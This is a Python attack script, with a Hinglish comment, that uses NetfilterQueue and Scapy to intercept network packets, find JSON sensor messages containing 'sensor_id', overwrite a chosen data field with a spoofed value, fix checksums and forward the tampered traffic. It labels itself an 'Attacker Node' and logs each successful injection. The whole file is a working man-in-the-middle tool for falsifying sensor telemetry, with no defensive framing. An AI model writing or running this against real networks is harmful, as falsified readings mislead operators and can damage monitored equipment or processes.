from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import json

# ---- YAHAN APNI EXCEL FILE KA ACTUAL COLUMN NAME DAALO ----
TARGET_COLUMN = "p1" 
SPOOFED_VALUE = 999.99     

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        try:
            raw_data = scapy_packet[scapy.Raw].load.decode('utf-8')
            
            if "sensor_id" in raw_data:
                payload = json.loads(raw_data.strip())
                
                if TARGET_COLUMN in payload["data"]:
                    original_val = payload["data"][TARGET_COLUMN]
                    payload["data"][TARGET_COLUMN] = SPOOFED_VALUE
                    
                    print(f"[!] INJECTION SUCCESS: Changed {TARGET_COLUMN} from {original_val} to {SPOOFED_VALUE}")
                    
                    new_raw_data = json.dumps(payload) + '\n'
                    scapy_packet[scapy.Raw].load = new_raw_data.encode('utf-8')
                    
                    # TCP Checksum Recalculation (Strictly Required)
                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.TCP].chksum
                    
                    packet.set_payload(bytes(scapy_packet))
        
        except json.JSONDecodeError:
            pass 
        except Exception as e:
            print(f"[Error] {e}")

    packet.accept()

queue = NetfilterQueue()
queue.bind(1, process_packet)
print("[*] Attacker Node Active. Intercepting on Queue 1...")

try:
    queue.run()
except KeyboardInterrupt:
    print("\n[-] Attack aborted. Flushing queues...")
    queue.unbind()